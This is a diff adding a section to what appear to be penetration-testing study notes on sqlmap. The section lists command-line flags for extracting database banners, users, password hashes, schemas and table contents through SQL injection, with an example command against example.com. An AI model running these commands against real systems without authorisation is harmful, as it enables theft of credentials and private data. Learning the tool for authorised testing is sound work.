@@ -176,6 +176,27 @@ Then: `$ sqlmap -r req.txt`
 ### SQLMap Data Exfiltration
 
 - SQLMap has a predefined set of queries for all supported DBMSes
+  - `--banner`: Database version banner
+  - `--current-user`: Current user name
+  - `--current-db`: Current database name
+  - `--is-dba`: Checking if the current user has DBA (administrator) rights
+  - `--passwords`: Password hashes
+  - `--hostname`:  Hostname
+  - Ex. `$ sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba`
+  - `--tables -D <database>`: Look at a tables in database <database>
+  - `--dump -T <table> -D <database>`: Look at data in table <table> in database <database>
+  - `--dump -T <table> -D <database> **-C <column>,<column2>**`: Only show certain columns
+  - `--dump -T <table> -D <database> **--start=2 --stop=3**`: Specify start and stop rows (inclusive)
+  - `--dump -T <table> -D <database> **--where="<condition>"**`: Get content of table based on WHERE condition
+  - `--dump -D <database> --exclude-sysdbs`: Exclude system databases
+  
+**Advanced Commands**
+- `--schema`: Retrieve the structure of all tables
+- `--search <query>`: Search for databases, tables, and columns of interest
+  - Ex. `--search -T user`: Search tables containing `user` keyword
+- 
+
+
 
 # Understanding the output
 
